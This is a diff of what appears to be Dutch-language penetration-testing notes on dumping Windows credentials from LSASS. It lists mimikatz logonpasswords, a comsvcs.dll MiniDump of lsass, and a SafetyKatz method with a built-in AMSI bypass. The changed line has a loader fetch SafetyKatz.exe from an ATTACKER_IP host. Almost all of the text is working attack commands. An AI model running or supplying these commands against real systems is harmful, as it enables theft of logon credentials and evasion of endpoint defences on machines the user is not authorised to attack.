@@ -12,5 +12,5 @@ mimikatz # sekurlsa::logonpasswords
 # Daarna normale dump:
 rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\tasks\lsass.dmp full
 # Methode 4: SafetyKatz (MiniDumpWriteDump in-memory, AMSI bypass ingebouwd)
-C:\Users\Public\Loader.exe -path http://10.0.0.1/tools/SafetyKatz.exe
+C:\Users\Public\Loader.exe -path http://ATTACKER_IP/tools/SafetyKatz.exe
 # Tip: Check PPL status: Get-Process lsass | Format-List *protect*
